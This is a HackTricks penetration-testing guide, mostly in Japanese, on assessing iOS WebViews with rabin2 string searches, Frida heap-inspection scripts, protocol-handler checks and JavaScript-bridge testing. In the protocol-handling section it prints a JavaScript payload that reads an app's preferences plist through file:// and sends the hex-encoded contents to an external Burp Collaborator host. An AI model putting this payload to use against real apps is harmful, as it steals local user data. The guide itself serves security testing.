# iOS WebViews

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

このページのコードは[こちら](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)から抽出されました。詳細についてはページを確認してください。

## WebViewsの種類

WebViews はアプリ内でWebコンテンツをインタラクティブに表示するために使用されます。iOSアプリケーション向けにさまざまな種類のWebViews があり、異なる機能とセキュリティ機能を提供しています。以下に簡単な概要を示します:

- **UIWebView** はiOS 12以降推奨されていません。**JavaScript** の無効化をサポートしていないため、スクリプトの挿入や **Cross-Site Scripting (XSS)** 攻撃の影響を受けやすくなっています。

- **WKWebView** はアプリにWebコンテンツを組み込むための選択肢です。コンテンツとセキュリティ機能に対する強化された制御を提供します。**JavaScript** はデフォルトで有効ですが、必要に応じて無効にすることもできます。また、JavaScript が自動的にウィンドウを開かないようにする機能をサポートし、すべてのコンテンツが安全に読み込まれることを保証します。さらに、**WKWebView** のアーキテクチャは、メインアプリプロセスに影響を与えるメモリ破損のリスクを最小限に抑えています。

- **SFSafariViewController** はアプリ内で標準化されたWebブラウジング体験を提供し、読み取り専用のアドレスフィールド、共有およびナビゲーションボタン、Safari でコンテンツを開くための直接リンクを含む特定のレイアウトで認識されます。**SFSafariViewController** では **JavaScript** を無効にすることはできず、Safari とクッキーおよびデータを共有し、ユーザーのプライバシーをアプリから保護します。App Store のガイドラインに従って目立つ位置に表示する必要があります。
```objetivec
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Configuration Exploration Summary

### **Static Analysis Overview**

**WebViews**の構成を調査する過程で、主に注目されるのは2つの主要なタイプ、**UIWebView**と**WKWebView**です。これらのWebViewsをバイナリ内で特定するために、特定のクラス参照や初期化メソッドを検索するためにコマンドが利用されます。

- **UIWebViewの識別**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
このコマンドは、バイナリ内でそれに関連するテキスト文字列を検索することで、**UIWebView** のインスタンスを特定するのに役立ちます。

- **WKWebViewの特定**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
同様に、**WKWebView**について、このコマンドは、その使用を示すテキスト文字列をバイナリ内で検索します。

さらに、**WKWebView**がどのように初期化されるかを見つけるために、次のコマンドが実行され、その初期化に関連するメソッドシグネチャが対象となります:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScriptの構成の検証**

**WKWebView**の場合、JavaScriptを無効にすることが必要でない限り、無効にすることがベストプラクティスとされています。`javaScriptEnabled`プロパティが`false`に設定されていることを確認するために、コンパイルされたバイナリを検索します。これにより、JavaScriptが無効になっていることが保証されます。
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Only Secure Content Verification**

**WKWebView**は、**UIWebView**とは対照的に、混合コンテンツの問題を特定する機能を提供します。これは、すべてのページリソースが安全な接続を介してロードされていることを確認するために`hasOnlySecureContent`プロパティを使用してチェックされます。コンパイルされたバイナリ内での検索は次のように行われます：
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **動的解析インサイト**

動的解析には、ヒープを調査してWebViewインスタンスとそのプロパティを調べる作業が含まれます。`webviews_inspector.js`というスクリプトが使用され、`UIWebView`、`WKWebView`、`SFSafariViewController`インスタンスを対象としています。このスクリプトは、見つかったインスタンスに関する情報をログに記録し、URLやJavaScript、セキュアコンテンツに関連する設定についても記録します。

ヒープの検査は、`ObjC.choose()`を使用してWebViewインスタンスを特定し、`javaScriptEnabled`や`hasonlysecurecontent`のプロパティをチェックすることができます。

{% code title="webviews_inspector.js" %}
```objetivec
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

スクリプトは次のように実行されます：
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**主な成果**:
- WebViewのインスタンスが正常に特定および検査されます。
- JavaScriptの有効化と安全なコンテンツ設定が検証されます。

この要約は、WebViewの構成を静的および動的アプローチを通じて分析する際に関与する重要な手順とコマンドを網羅し、JavaScriptの有効化や混合コンテンツの検出などのセキュリティ機能に焦点を当てています。

## WebViewプロトコルの処理

WebViewでコンテンツを処理することは重要な側面であり、特に`http(s)://`、`file://`、`tel://`などのさまざまなプロトコルを扱う場合に重要です。これらのプロトコルにより、アプリ内でリモートおよびローカルコンテンツの読み込みが可能になります。ローカルコンテンツを読み込む際には、ユーザーがファイル名やパスを操作したり、コンテンツ自体を編集したりすることを防ぐための注意が必要です。

**WebViews**はコンテンツの読み込みに異なるメソッドを提供しています。**UIWebView**では、`loadHTMLString:baseURL:`や`loadData:MIMEType:textEncodingName:baseURL:`などのメソッドが使用されます（現在は非推奨）。一方、**WKWebView**では、Webコンテンツのために`loadHTMLString:baseURL:`、`loadData:MIMEType:textEncodingName:baseURL:`、`loadRequest:`が使用されます。ローカルファイルを読み込む際には、通常、`pathForResource:ofType:`、`URLForResource:withExtension:`、`init(contentsOf:encoding:)`などのメソッドが利用されます。特に、`loadFileURL:allowingReadAccessToURL:`メソッドは、WebViewに特定のURLやディレクトリを読み込ませる能力を持っており、ディレクトリが指定された場合には機密データが露出する可能性があります。

これらのメソッドをソースコードやコンパイルされたバイナリで見つけるためには、次のようなコマンドが使用されます:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Regarding **file access**, UIWebView allows it universally, whereas WKWebView introduces `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` settings for managing access from file URLs, with both being false by default.

A Frida script example is provided to inspect **WKWebView** configurations for security settings:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
最後に、ローカルファイルを外部に送信するためのJavaScriptペイロードの例が、適切に構成されていないWebViewsに関連する潜在的なセキュリティリスクを示しています。このペイロードはファイルの内容を16進数形式にエンコードしてからサーバーに送信するため、WebViewの実装における厳格なセキュリティ対策の重要性が強調されています。
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## WebViewを介して公開されるネイティブメソッド

## iOSにおけるWebViewネイティブインターフェースの理解

iOS 7以降、AppleはWebView内のJavaScriptとネイティブなSwiftまたはObjective-Cオブジェクト間の通信のためのAPIを提供しました。この統合は主に次の2つの方法を通じて実現されます：

- **JSContext**：SwiftまたはObjective-Cブロックが`JSContext`内の識別子にリンクされると、JavaScript関数が自動的に作成されます。これにより、JavaScriptとネイティブコードの間でシームレスな統合と通信が可能になります。
- **JSExport Protocol**：`JSExport`プロトコルを継承することで、ネイティブのプロパティ、インスタンスメソッド、およびクラスメソッドをJavaScriptに公開できます。これにより、JavaScript環境で行われた変更がネイティブ環境にも反映され、その逆も同様です。ただし、この方法を介して機密データが誤って公開されないようにすることが重要です。

### Objective-Cでの`JSContext`へのアクセス

Objective-Cでは、`UIWebView`の`JSContext`には次のコード行でアクセスできます：
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### `WKWebView`との通信

`WKWebView`では、`JSContext`への直接アクセスは利用できません。代わりに、`postMessage`関数を介してメッセージのやり取りが行われ、JavaScriptからネイティブへの通信が可能となります。これらのメッセージのハンドラは以下のように設定され、JavaScriptがネイティブアプリケーションと安全にやり取りできるようになります。
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### インタラクションとテスト

JavaScriptは、スクリプトメッセージハンドラを定義することで、ネイティブレイヤーとやり取りできます。これにより、Webページからネイティブ関数を呼び出すなどの操作が可能になります。
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
以下は、ネイティブ関数呼び出しの結果をキャプチャして操作するために、HTML内でコールバック関数をオーバーライドする方法です：
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
ネイティブ側は、`JavaScriptBridgeMessageHandler` クラスで JavaScript の呼び出しを処理し、数値の乗算などの操作の結果を処理して JavaScript に送り返し、表示やさらなる操作を行います。
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## iOS WebViewsのデバッグ

（[https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)からのチュートリアルに基づく）

iOSのWebViews内のWebコンテンツを効果的にデバッグするには、`console.log()`に送信されたメッセージがXcodeログに表示されないため、Safariの開発者ツールを使用する特定のセットアップが必要です。以下は、主要な手順と要件を強調した簡略化されたガイドです：

- **iOSデバイスの準備**: iOSデバイスでSafari Web Inspectorを有効にする必要があります。これは、**設定 > Safari > Advanced**に移動し、_Web Inspector_を有効にすることで行われます。

- **macOSデバイスの準備**: macOSの開発マシンで、Safari内で開発者ツールを有効にする必要があります。Safariを起動し、**Safari > Preferences > Advanced**にアクセスし、_Show Develop menu_オプションを選択します。

- **接続とデバッグ**: iOSデバイスをmacOSコンピュータに接続し、アプリケーションを起動した後、macOSデバイス上のSafariを使用してデバッグしたいWebViewsを選択します。Safariのメニューバーで_Develop_に移動し、iOSデバイスの名前をホバーしてWebViewsのリストを表示し、調査したいインスタンスを選択します。この目的のために新しいSafari Web Inspectorウィンドウが開きます。

ただし、次の制限に注意してください：

- この方法でのデバッグにはmacOSデバイスが必要です。なぜなら、Safariに依存しているからです。
- この方法では、Xcodeを介してデバイスにロードされたアプリケーション内のWebViewsのみがデバッグの対象となります。App StoreやApple Configuratorを介してインストールされたアプリ内のWebViewsはこの方法でデバッグできません。


## 参考文献

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**する。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
